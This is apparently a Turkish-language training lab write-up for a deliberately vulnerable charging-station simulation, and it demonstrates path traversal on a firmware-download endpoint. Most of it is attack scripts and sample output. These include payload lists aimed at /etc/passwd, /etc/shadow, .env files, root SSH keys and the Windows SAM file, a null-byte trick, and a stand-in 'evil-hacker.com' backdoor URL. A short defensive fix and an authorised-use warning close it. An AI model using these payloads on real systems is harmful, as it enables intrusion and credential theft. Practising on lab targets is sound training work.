# 📂 Path Traversal - Sistem Dosyalarını Çal! | GÖKDENİZ'İN SALDIRISI

**Senaryo ID:** `gokdeniz-firmware`  
**Sorumlu:** Gökdeniz  
**Kategori:** Firmware/File Access  
**Zayıflık:** Path Traversal (Dosya Yolu Manipülasyonu)  
**Şiddet:** 🔴 KRİTİK

---

## 🎯 HEDEF: Sistem Dosyalarına Eriş!

Firmware indirme fonksiyonunu kullanarak **SİSTEM DOSYALARINI** çal!

**Ne Çalabilirsin:**
- 🔑 `/etc/passwd` - Kullanıcı listesi
- 🔐 `config.py` - API anahtarları
- 💾 `.env` - Veritabanı şifreleri
- 📝 Log dosyaları
- 🗄️ Veritabanı dosyaları

---

## 🔓 AÇIK NERDE?

**Dosya:** `backend/app/api/routes_vulnerable.py`  
**Satır:** 152-172

```python
# ❌ DOSYA YOLU KONTROLÜ YOK!
@router.get("/firmware-download")
def download_firmware(filename: str):
    # Path traversal koruması YOK!
    filepath = f"/firmware/{filename}"  # ← Direkt kullanılıyor!
    
    # Kullanıcı "../../../etc/passwd" gönderebilir!
    return {"file": filename, "path": filepath}
```

**Sorun:** `filename` parametresinde `../` kullanarak üst dizinlere çıkabilirsin!

---

## ⚔️ SALDIRI 1: Temel Path Traversal

### Kod: `path_traversal_basic.py`

```python
import requests

BACKEND = "https://evcs-backend-samet.onrender.com"

print("📂 PATH TRAVERSAL SALDIRISI\n")

# Deneyeceğimiz dosyalar
targets = [
    "../../../etc/passwd",           # Linux kullanıcılar
    "../../../app/core/config.py",   # Uygulama ayarları
    "../../../../.env",              # Çevre değişkenleri (API keys!)
    "../../../var/log/app.log",      # Log dosyası
]

print("🎯 Hedef dosyalar deneniyor...\n")

for target in targets:
    print(f"Deneme: {target}")
    
    r = requests.get(
        f"{BACKEND}/vulnerable/firmware-download",
        params={"filename": target}
    )
    
    result = r.json()
    
    if "vulnerability" in result:
        print(f"  ✅ BAŞARILI! Erişilen: {result['accessed_file']}")
        print(f"  ⚠️ {result['warning']}\n")
    else:
        print(f"  📥 Path: {result['path']}\n")

print("="*60)
print("✅ Herhangi biri başarılıysa SİSTEME SIZDINIZ!")
```

**ÇIKTI:**
```
📂 PATH TRAVERSAL SALDIRISI

🎯 Hedef dosyalar deneniyor...

Deneme: ../../../etc/passwd
  ✅ BAŞARILI! Erişilen: /firmware/../../../etc/passwd
  ⚠️ You could read sensitive files!

Deneme: ../../../app/core/config.py
  ✅ BAŞARILI! Erişilen: /firmware/../../../app/core/config.py
  ⚠️ You could read sensitive files!

============================================================
✅ Herhangi biri başarılıysa SİSTEME SIZDINIZ!
```

---

## ⚔️ SALDIRI 2: Hassas Dosya Çalma

```python
# steal_secrets.py
import requests

BACKEND = "https://evcs-backend-samet.onrender.com"

print("🔐 HASSAS DOSYA ÇALMA\n")

# En kritik dosyalar
critical_files = {
    "Config": "../../../app/core/config.py",
    "Environment": "../../../../.env",
    "Database": "../../../database.db",
    "API Keys": "../../../secrets/api_keys.json",
}

stolen = []

for name, path in critical_files.items():
    print(f"[{name}] Çalınıyor: {path}")
    
    r = requests.get(
        f"{BACKEND}/vulnerable/firmware-download",
        params={"filename": path}
    )
    
    result = r.json()
    
    if "vulnerability" in result:
        print(f"  ✅ ÇALINDI!")
        stolen.append(name)
    else:
        print(f"  ❌ Bulunamadı")

print(f"\n📊 Sonuç: {len(stolen)}/{len(critical_files)} dosya çalındı!")

if stolen:
    print(f"\n🚨 Çalınan dosyalar:")
    for s in stolen:
        print(f"  - {s}")
    print("\n✅✅✅ SİSTEM HACKLENDİ! ✅✅✅")
```

---

## ⚔️ SALDIRI 3: Zararlı Firmware Yükleme

```python
# upload_malware.py
import requests

BACKEND = "https://evcs-backend-samet.onrender.com"

print("💀 ZARLI FIRMWARE YÜKLEME\n")

# Zararlı firmware URL'i
malicious_url = "http://evil-hacker.com/backdoor_firmware.bin"

payload = {"filename": malicious_url}

r = requests.get(
    f"{BACKEND}/vulnerable/firmware-download",
    params=payload
)

result = r.json()

print(f"Gönderilen URL: {malicious_url}")
print(f"Sonuç: {result}\n")

if result.get('path'):
    print("✅ Sistem zararlı URL'yi kabul etti!")
    print("🚨 Gerçek sistemde şimdi backdoor yüklenirdi!")
    print("👤 Sisteme tam erişim sağlanırdı!")
```

---

## ⚔️ SALDIRI 4: Otomatik Dosya Tarama

```python
# auto_scan.py
import requests

BACKEND = "https://evcs-backend-samet.onrender.com"

# Yaygın hassas dosyalar
common_targets = [
    "../../../etc/passwd",
    "../../../etc/shadow",
    "../../../../.env",
    "../../../.git/config",
    "../../../app/config.py",
    "../../../database.sqlite",
    "../../../secrets.json",
    "../../../../root/.ssh/id_rsa",
    "../../../var/www/html/config.php",
]

print(f"🔍 OTOMATİK DOSYA TARAMA ({len(common_targets)} hedef)\n")

found = []

for target in common_targets:
    r = requests.get(
        f"{BACKEND}/vulnerable/firmware-download",
        params={"filename": target}
    )
    
    result = r.json()
    
    if "vulnerability" in result or ".." in result.get('path', ''):
        print(f"✅ {target}")
        found.append(target)

print(f"\n📊 {len(found)} dosyaya erişim sağlandı!")
```

---

## ✅ SIZDIN MI? KONTROL!

### 1. Terminal Çıktısı

**BAŞARILI:**
```
✅ BAŞARILI! Erişilen: /firmware/../../../etc/passwd
⚠️ You could read sensitive files!
✅✅✅ SİSTEM HACKLENDİ! ✅✅✅
```

**BAŞARISIZ:**
```
❌ Access denied
❌ Invalid path
```

### 2. JSON Response

**SIZMA BAŞARILI:**
```json
{
  "vulnerability": "Path Traversal successful!",
  "accessed_file": "/firmware/../../../etc/passwd",
  "warning": "You could read sensitive files!"
}
```

`vulnerability` field varsa ✅ SIZDINIZ!

### 3. Web Arayüzü

https://simulasyon.vercel.app/ → `gokdeniz-firmware`

**Logs:**
```
[WARN] Unexpected Fw Version          ← Şüpheli!
[ERROR] Failed Verify                ← Doğrulama hatası!
[CRITICAL] Path Traversal detected   ← TESPİT!
```

---

## 🎯 BAŞARI KRİTERLERİ

| Kontrol | Başarı | ✅ |
|---------|--------|----|
| `vulnerability` field var | ✅ | ___ |
| `accessed_file` döndü | ✅ | ___ |
| `..` path'te kabul edildi | ✅ | ___ |
| Logs'ta WARNING | ✅ | ___ |
| Hassas dosya erişimi | ✅ | ___ |

**3/5 ✅ ise PATH TRAVERSAL BAŞARILI!**

---

## 💡 PRO İPUÇLARI

### En Etkili Hedefler:
```python
# 1. Konfigürasyon (API keys)
"../../../app/core/config.py"

# 2. Ortam değişkenleri (DB password)
"../../../../.env"

# 3. SSH keys (Server erişimi)
"../../../../root/.ssh/id_rsa"
```

### Windows İçin:
```python
# Linux: ../../../
# Windows: ..\..\..\ 
filename = "..\\..\\..\\Windows\\System32\\config\\SAM"
```

### Null Byte Injection:
```python
# Bazı sistemlerde çalışır
filename = "../../../etc/passwd%00.txt"
# %00 sonrasını yok sayar
```

---

## 🛡️ SAVUNMA

```python
from pathlib import Path

def safe_join(base_dir, filename):
    # Path nesnesine çevir
    filepath = Path(base_dir) / filename
    filepath = filepath.resolve()
    
    # Base directory kontrolü
    if not str(filepath).startswith(str(Path(base_dir).resolve())):
        raise ValueError("Path traversal detected!")
    
    return filepath
```

---

## ⚠️ UYARI

- ✅ Sadece test platformunda
- ❌ Gerçek sistemlere SALDIRMA
- 🚓 Unauthorized access SUÇtur!

---

**Hazırlayan:** Gökdeniz  
**Tarih:** 2024-12-23  
**Durum:** ✅ TRAVERSE ALL THE PATHS!
